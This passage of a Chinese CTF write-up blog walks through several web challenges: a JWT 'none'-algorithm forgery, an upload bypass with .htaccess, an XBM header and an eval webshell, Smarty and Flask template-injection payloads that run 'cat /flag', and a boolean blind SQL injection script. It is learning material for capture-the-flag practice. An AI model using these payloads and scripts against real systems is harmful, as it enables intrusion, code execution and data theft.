&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function logout() &#123;</span><br><span class="line">    $.get(&apos;/api/logout&apos;).done(function(data) &#123;</span><br><span class="line">        const &#123;status&#125; = data;</span><br><span class="line">        if(status) &#123;</span><br><span class="line">            document.location = &apos;/login&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getflag() &#123;</span><br><span class="line">    $.get(&apos;/api/flag&apos;).done(function(data) &#123;</span><br><span class="line">        const &#123;flag&#125; = data;</span><br><span class="line">        $(&quot;#username&quot;).val(flag);</span><br><span class="line">    &#125;).fail(function(xhr, textStatus, errorThrown) &#123;</span><br><span class="line">        alert(xhr.responseJSON.message);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里分析其实没啥东西，就是提请求。不过之前没学过这种用法，现在也算是学到新知识了。<br>这种用法的相关参考在这里<a href="https://www.w3schools.com/jquery/ajax_get.asp" target="_blank" rel="noopener">传送门</a><br>继续做题发现应该是让以admin身份去读flag，发现有jwt内容，尝试破解，不成功。<br>只能看wp去了。<a href="https://blog.csdn.net/a3320315/article/details/105619800" target="_blank" rel="noopener">wp</a><br>这里是可以看源码的。按wp的说法，koa框架的结构如下<br><img src="https://i.loli.net/2020/04/23/lAfVSBHbUjQCWq5.png" alt="Snipaste_2020-04-23_12-20-48.png"><br>访问controllers/api.js就能看到源码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">const crypto = require(&apos;crypto&apos;);</span><br><span class="line">const fs = require(&apos;fs&apos;)</span><br><span class="line">const jwt = require(&apos;jsonwebtoken&apos;)</span><br><span class="line"></span><br><span class="line">const APIError = require(&apos;../rest&apos;).APIError;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    &apos;POST /api/register&apos;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || username === &apos;admin&apos;)&#123;</span><br><span class="line">            throw new APIError(&apos;register error&apos;, &apos;wrong username&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(global.secrets.length &gt; 100000) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret = crypto.randomBytes(18).toString(&apos;hex&apos;);</span><br><span class="line">        const secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &apos;HS256&apos;&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &apos;POST /api/login&apos;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || !password) &#123;</span><br><span class="line">            throw new APIError(&apos;login error&apos;, &apos;username or password is necessary&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        const sid = JSON.parse(Buffer.from(token.split(&apos;.&apos;)[1], &apos;base64&apos;).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        console.log(sid)</span><br><span class="line"></span><br><span class="line">        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;</span><br><span class="line">            throw new APIError(&apos;login error&apos;, &apos;no such secret id&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        const user = jwt.verify(token, secret, &#123;algorithm: &apos;HS256&apos;&#125;);</span><br><span class="line"></span><br><span class="line">        const status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        if(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &apos;GET /api/flag&apos;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        if(ctx.session.username !== &apos;admin&apos;)&#123;</span><br><span class="line">            throw new APIError(&apos;permission error&apos;, &apos;permission denied&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const flag = fs.readFileSync(&apos;/flag&apos;).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &apos;GET /api/logout&apos;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = null;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: true</span><br><span class="line">        &#125;)</span><br><span class="line">        await next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>虽然没学过node.js但是大概意思还是看得懂的，<br>注册的时候不能让用户名为admin，而且随机生成一个secret来加密，随后把这个secret push进数组里。<br>然后返回生成的jwt内容，保存在前端。</p>
+<p>登录的时候会去获取这个jwt，然后解析这个jwt的内容，<strong>根据里面的secretid来选择这个用户对应的secret</strong><br>这里要注意，如果解析的时候secret为空，就会用空加密算法去解析jwt。所以本题的目标很明确了，就是想办法让secretid对应的secret为空，<br>这里的判断逻辑是，只要能正确从jwt里解析出内容，且解析出来的用户名，密码和上传的用户名，密码相等就能让session.name=username<br>还有一个问题，secretid要大于0，且小于保存有secret的数组长度，这里可以用小数来绕过这个判断。</p>
+<p>getflag要求就是session.name为admin。</p>
+<p>接下来就是构造的点了，用python构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install PyJWT</span><br><span class="line"></span><br><span class="line">import jwt</span><br><span class="line">print(jwt.encode(&#123;&apos;secretid&apos;: 0.9, &apos;username&apos;: &apos;admin&apos;, &apos;password&apos;: &apos;test&apos;, &apos;ita&apos;:12345678&#125;, key=&apos;&apos;, algorithm=&apos;none&apos;))</span><br></pre></td></tr></table></figure>
+<p>然后登录的时候抓包，改jwt为我们生成的jwt，用户名和密码也要一致不然过不了后端判断。<br><img src="https://i.loli.net/2020/04/23/ExDnHGbdciOBT5J.png" alt="Snipaste_2020-04-23_12-36-57.png"><br>最后点getflag就能拿到flag了。flag不会回显可以抓包看。</p>
+<h3 id="总结-10"><a href="#总结-10" class="headerlink" title="总结"></a>总结</h3><p>这道题虽然意识到jwt有问题，但是还是没能解题，知识储备太少了，检索能力又差。<br>一是没办法自己获取到后端源码，二是不知道secret为空时解密会使用空算法。</p>
+<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>知识点</p>
+<ul>
+<li>不可见字符shell</li>
+<li>可变变量的执行</li>
+<li>php的特性，未定义的常量假定作为字符串处理，所以传🐎的时候可用<code>$_GET[&#39;123&#39;]</code>也可以用<code>$_GET[123]</code></li>
+<li>exif_imagetype函数绕过(使用XBM文件格式绕过)</li>
+<li>php7下去除了asp标签和language=”php”标签，绕过&lt;?过滤。(采用编码绕过)</li>
+<li>.htaccess文件构造(把编码的php内容还原)</li>
+<li>open_basedir的绕过</li>
+</ul>
+<hr>
+<p>进去就给了源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function get_the_flag()&#123;</span><br><span class="line">    // webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">        if(mb_strpos(file_get_contents($tmp_name), &apos;&lt;?&apos;)!==False) die(&quot;^_^&quot;);</span><br><span class="line">    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path= $userdir.&quot;/&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[&apos;_&apos;];</span><br><span class="line"></span><br><span class="line">if (!$hhh)&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strlen($hhh)&gt;18)&#123;</span><br><span class="line">    die(&apos;One inch long, one inch strong!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( preg_match(&apos;/[\x00- 0-9A-Za-z\&apos;&quot;\`~_&amp;.,|=[\x7F]+/i&apos;, $hhh) )</span><br><span class="line">    die(&apos;Try something else!&apos;);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, 3);</span><br><span class="line">if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);</span><br><span class="line"></span><br><span class="line">eval($hhh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>一开始以为能直接getshell，但是由于长度限制，无法达成。<br>思路就是想办法执行get_the_flag来执行上传文件getshell。<br>做题的时候参考了这个 <a href="https://www.guildhab.top/?p=677" target="_blank" rel="noopener">wp传送门</a><br>可以说学到非常多。</p>
+<hr>
+<p>这里可以看到，过滤了非常多的字符，所以写了一个脚本来fuzz剩下的字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">allow = []</span><br><span class="line">for i in range(1,256): #修改范围为127就是不可见字符</span><br><span class="line">    if re.match(r&apos;[^\x00- 0-9A-Za-z\&apos;&quot;\`~_&amp;.,|=[\x7F]+&apos;,chr(i)):</span><br><span class="line">        allow.append(i)</span><br><span class="line"># 异或取反</span><br><span class="line">answer = &apos;_GET&apos;</span><br><span class="line">s1 = &apos;&apos;</span><br><span class="line">s2 = &apos;&apos;</span><br><span class="line">for i in answer:</span><br><span class="line">    for c in allow:</span><br><span class="line">        for j in allow:</span><br><span class="line">            if c ^ j == ord(i):</span><br><span class="line">                s1 += hex(c)</span><br><span class="line">                s2 += hex(j)</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">        break</span><br><span class="line">    print(s1.replace(&apos;0x&apos;,&apos;%&apos;)+&apos;^&apos;+s2.replace(&apos;0x&apos;,&apos;%&apos;))</span><br><span class="line"># 可见字符还剩下这些</span><br><span class="line">!#$%()*+-/:;&lt;&gt;?@\]^&#123;&#125;</span><br></pre></td></tr></table></figure>
+<p>这些可见字符都有些特殊含义，不太好用，直接用不可见字符来构造一个payload<br>最后得到_GET的payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%80%80%80%80^%df%c7%c5%d4</span><br></pre></td></tr></table></figure>
+<p><strong>这个payload之所以能用要多亏php的假定</strong><br>会把这些没定义的常量假设为字符串进行异或<br>这里还有个问题，由于过滤了非常多的字符而且有长度限制，不能用<br>?_=$xx=payload的形式来直接执行命令，<br>这里采用可变变量和可变函数的方法来执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=phpinfo</span><br><span class="line">// 转变后变成$_GET[%80]</span><br></pre></td></tr></table></figure>
+<p>访问这个url就可以执行phpinfo<br><img src="https://i.loli.net/2020/04/24/UAJL4yvYQoM8pF3.png" alt="Snipaste_2020-04-24_11-47-33.png"></p>
+<hr>
+<p>现在可以执行get_the_flag了，分析一下代码，要成功上传文件，需要过三个关卡</p>
+<ul>
+<li>后缀不能有ph</li>
+<li>对&lt;?进行了过滤，而且php版本为7.2，使用language=”php”已经行不通，<a href="https://xz.aliyun.com/t/273" target="_blank" rel="noopener">php版本改动</a></li>
+<li>用exif_imagetype对文件进行了检查，满足某种格式才能上传<br>服务器是apache，这里应该可以想到要上传一个.htaccess来解析文件为php。可以用AddType。<br>但是文件同时还过滤了&lt;?，所以需要对上传的php语句进行编码，可以采用base64编码。<br>最后还有一个问题，要怎么上传文件上去？如果用传统的GIF89a，是会把.htaccess弄得不可用的，明显不可以这么用。<br>参考wp，可以看看exif_imagetype支持的文件格式，这里最理想的情况应该是找到一种文件头既不影响.htaccess和php文件，又能成功上传<br>可以google搜索.gif,.png,…,.XBM，一路搜索下来，在wiki发现了XBM的文件格式如下：<br><img src="https://i.loli.net/2020/04/24/vdH7PUxCqpDa6iA.png" alt="Snipaste_2020-04-24_11-57-37.png"><br>文件的定义是通过两行#define定义的，<br>而且#在.htaccess和php文件中都有注释的意思，可以说是非常理想的文件格式了。<br>接下来构造一个.htaccess文件上传，如下：<br><img src="https://i.loli.net/2020/04/24/ezDQi8S52A1nPVK.png" alt="Snipaste_2020-04-24_12-01-00.png"><br>这里用addtype把.ppp格式的文件当作php文件来进行解析。<br>(当然也可以用SetHandler application/x-httpd-php)<br>同时还在访问被当作php解析的文件的时候自动包含了test.ppp文件的内容(也就是执行test.ppp的内容)<br>由于test.ppp的文件内容是经过base64编码的，所以读出来的时候要先<strong>解码</strong>。</li>
+</ul>
+<hr>
+<p>接下来是构造一个test.ppp文件，先构造phpinfo看看<br><img src="https://i.loli.net/2020/04/24/PwDdKL1lGrh4juk.png" alt="Snipaste_2020-04-24_12-04-52.png"><br>这里要注意一下两行#define的内容长度，因为读test.ppp的时候，对test.ppp的文件内容进行了base64解码，<br>所以如果要解码的数据对不上，会解码失败。这里会被解码的数据为合法的base64字符，也就是a-z，A-Z,0-9,还有几个符号。<br><strong>注意，#,空格等不是base64的字符不会造成影响</strong>。<br>这里把两行define的合法字符数据构造成4的倍数就能成功解析。</p>
+<hr>
+<p>此时访问test.ppp已经可以成功执行phpinfo(访问任何ppp文件其实也都行，因为都会先包含test.ppp的内容)<br>把phpinfo()换成shell尝试getshell。<br>更好test.ppp文件覆盖之前的test.ppp文件内容，启动蚁剑尝试连接，成功<br><img src="https://i.loli.net/2020/04/24/ci9VoKX17FnQBxE.png" alt="Snipaste_2020-04-24_12-12-11.png"><br>成功getshell之后，发现只能访问html目录下的内容，看wp是有一个open_basedir的限制。<br>这里是一个open_basedir的绕过方法。<br><img src="https://i.loli.net/2020/04/24/H2ZFY1b9i6KUQPN.png" alt="Snipaste_2020-04-24_12-16-35.png"><br>关于open_basedir的绕过，在推特搜好像比搜谷歌都好使，，感觉以后可以多上推特搜东西了。。<br>根据提示，构造如下php语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#define width 1377</span><br><span class="line">#define height 1377</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	eval($_POST[&apos;123456&apos;]);</span><br><span class="line">	mkdir(&apos;bbb&apos;);</span><br><span class="line">	chdir(&apos;bbb&apos;);</span><br><span class="line">	ini_set(&apos;open_basedir&apos;,&apos;..&apos;);</span><br><span class="line">	chdir(&apos;..&apos;);</span><br><span class="line">	chdir(&apos;..&apos;);</span><br><span class="line">	chdir(&apos;..&apos;);</span><br><span class="line">	chdir(&apos;..&apos;);</span><br><span class="line">	chdir(&apos;..&apos;);</span><br><span class="line">	chdir(&apos;..&apos;);</span><br><span class="line">	ini_set(&apos;open_basedir&apos;,&apos;/&apos;);</span><br><span class="line">	#var_dump(scandir(&apos;/&apos;));</span><br><span class="line">	var_dump(file_get_contents(&apos;/THis_Is_tHe_F14g&apos;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/04/24/YAWcl9kmpE15abK.png" alt="Snipaste_2020-04-24_14-18-53.png"><br>先扫描根目录，随后再访问test.ppp就拿到flag了。<br>这里尝试了用蚁剑这样连接，实际上并不能在蚁剑上获得查看根目录的权限<br>但是脚本却可以读到根目录下文件内容。<br>一开始尝试执行系统命令，后来发现行不通，检查了disable_func发现过滤了，老老实实读flag了。</p>
+<h3 id="总结-11"><a href="#总结-11" class="headerlink" title="总结"></a>总结</h3><p>这道题学到非常多，既复习了php的shell构造，处理常量的特性，又学到了绕过exif_imagetype的好方法，<br>还学习了一把.htaccess的新用法(auto_prepend和php://fileter)，最后还学到了过open_basedir的方法。</p>
+<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>知识点</p>
+<ul>
+<li>ssti注入</li>
+</ul>
+<hr>
+<p>进去就是这样一个页面，注意到一行小字<br>build with smarty!<br><img src="https://i.loli.net/2020/04/24/vTf9CUNPmjHMEiu.png" alt="Snipaste_2020-04-24_16-00-04.png"><br>可能存在ssti。<br>使用方法是访问/api/或者/xff/<br>bp抓包测试7.在x-forwarded-for处发现注入点。<br>随后执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&apos;ls /&apos;)&#125;&#125;</span><br><span class="line">&#123;&#123;system(&apos;cat /flag&apos;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>即可拿到flag。<br><img src="https://i.loli.net/2020/04/24/zVJUfitX2CyA5qh.png" alt="Snipaste_2020-04-24_16-03-28.png"></p>
+<h3 id="总结-12"><a href="#总结-12" class="headerlink" title="总结"></a>总结</h3><p>碰到过类似的题型，而且看到这种受控制的回显，肯定要测一下xss和ssti的。。</p>
+<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>知识点</p>
+<ul>
+<li>ssti<br>又是一个ssti题。其实一看到Flask就该想到的，python相关的考点大多都是ssti，尤其是这种明示了Flask模板之类的，考点大多应该是ssti。</li>
+</ul>
+<hr>
+<p>进去是一个base64加密和解密的界面。在加密界面加密的值可以在解密界面回显出来。<br>可以用1加密测试ssti。回显1.可以确定有ssti了。<br>还可以输入一些不是base64的数据，让页面报错，回显的错误信息可以查看代码，可以看到如下代码<br><img src="https://i.loli.net/2020/04/24/oMqZ4lJw2LDGbWa.png" alt="Snipaste_2020-04-24_23-43-11.png"><br>看到这里应该也能想到ssti的问题了。<br>接下来就是想办法执行命令了<br>参考这篇文章<a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">ssti-payload构造</a><br>这里刚好题目版本也是3.7.就直接在我本地上构造了如下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&apos;popen&apos;](&apos;dir&apos;).read()</span><br></pre></td></tr></table></figure>
+<p>不过这个payload在本题不能用，两个原因</p>
+<ul>
+<li>服务器上python多了少了一个包，要把128改成127.<br>这里发现过滤了popen，根据刚才的参考文章，可以用拼接的方法绕过<br>最后得到如下payload<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&apos;po&apos;+&apos;pen&apos;](&apos;ls /&apos;).read()</span><br></pre></td></tr></table></figure>
+发现根目录下有flag文件。<br>这里测试之后发现过滤了flag。<br>继续用拼接绕过就行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__bases__[0].__subclasses__()[127].__init__.__globals__[&apos;po&apos;+&apos;pen&apos;](&apos;cat /this_is_the_fl&apos;+&apos;ag.txt&apos;).read()</span><br></pre></td></tr></table></figure>
+这样就成功拿到flag了。<br>这里的坑主要是对构造这个payload不熟悉，花了一下时间。<h3 id="总结-13"><a href="#总结-13" class="headerlink" title="总结"></a>总结</h3>这道题还是有点让自己更加熟悉的感觉吧，重复的做ssti题目，刺激自己的敏感性。<br>接下来只要看到python相关的，或者python的模板相关的基本就要反射性想到ssti了。<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2>知识点</li>
+<li>bool盲注</li>
+<li>无列名注入(采用表字段比较方法爆数据)</li>
+<li>information_schema的绕过(其实不止过滤了这个，mysql.innode之类的也过滤了)</li>
+</ul>
+<hr>
+<p>进去是一个查询链接。<br>输入1，2，3有数据回显。<br>输入100报错。<br>尝试输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ascii(&apos;a&apos;)&gt;0)</span><br></pre></td></tr></table></figure>
+<p>返回了输入1时回显的内容。基本可以确定本题考bool盲注了。<br>尝试获取列名的时候发现information_schema给过滤了，这种过滤不是第一次碰到，有遇到过。<br>可以参考这两篇的方法绕过。<br><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">information_schema的绕过</a><br><a href="https://blog.csdn.net/weixin_43536759/article/details/104847916" target="_blank" rel="noopener">mysql查表名的多种方法</a><br>这里采用sys.schema_table_statistics_with_buffer来代替被过滤的information_schema获取表名。<br>使用这个脚本得到表名是users233333333333333,f1ag_1s_h3r3_hhhhh</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s = &apos;&apos;</span><br><span class="line">url = &apos;http://3e1352b3-0bd6-4856-975c-7456ae942600.node3.buuoj.cn/index.php&apos;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    low = 32</span><br><span class="line">    high = 127</span><br><span class="line">    mid = (32 + 127) // 2</span><br><span class="line">    while(low != high):</span><br><span class="line">        payload = f&apos;(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;)&apos; # users233333333333333,f1ag_1s_h3r3_hhhhh</span><br><span class="line">        data = &#123;&apos;id&apos;: payload&#125;</span><br><span class="line">        # print(data)</span><br><span class="line">        # input()</span><br><span class="line">        res = requests.post(url,data=data)</span><br><span class="line">        if &apos;Nu1L&apos; in res.text:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    s += chr(low)</span><br><span class="line">    print(s)</span><br></pre></td></tr></table></figure>
+<p>接下来是无列名注入了。因为之前有碰到过过滤Information_schema的题目，虽然可以找到代替获取表名的表，但是却没办法获取列名了。<br>这里本来想参考之前做过的一道无列名注入，采用union select的方式爆数据。但是发现union select再配上一些别的数据就会被过滤。<br>那就是此路不通了。<br>随后参考了Y1ing师傅的wp。<br><a href="https://www.gem-love.com/ctf/1782.html" target="_blank" rel="noopener">传送门</a><br>知道了利用比较的方法爆数据，这个真的有点顶。。要详细说一下工作的原理。</p>
+<hr>
+<p>首先select ‘add’ &gt; ‘b’; 是返回0的。<br>因为mysql对字符串的比较是按位来的，如果第一位相等才继续比较第二位。<br><strong>字符串和数字进行比较。mysql里数字和字符串比较会把字符串转数字，比如123abc会转成123</strong>.<br>这和php非常的相似。<br>比如select 1 &gt; ‘abc’;是恒为真的。因为’abc’转换数字是0.<br>而且有一个特别的地方，可以对整个表进行比较。<br>比如select ((select ‘a’,’b’,’c’) &gt; (select * from ctf));<br>这里要比较的两个表必须有相同的列。因为比较的规则如下。</p>
+<p>先尝试比较第一个字段。如果第一个字段为真/假，整体就返回真/假。<br>如果第一个字段相等，才会尝试比较第二个字段，结果有第二个字段决定。<br>如果第二个字段还想等，才会比较第三个字段。</p>
+<p>也就是说，如果有一个字段出现了不等，比较的结果就由这个字段的比较来决定。</p>
+<p>这里可以扩展一下，如果采用=判断相等，要所有字段都相等才会返回真。而大于小于比较则是由某一个字段就可以决定结果。<br>比较测试可以看这张图。<br><img src="https://i.loli.net/2020/04/28/uXIn3gkYjDJlCN8.png" alt="Snipaste_2020-04-28_12-27-19.png"></p>
+<hr>
+<p>知道了怎么利用&gt;比较两个表，首先需要先测试出要查询的表有几列。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((select 1,2)&gt;(select * from f1ag_1s_h3r3_hhhhh))</span><br></pre></td></tr></table></figure>
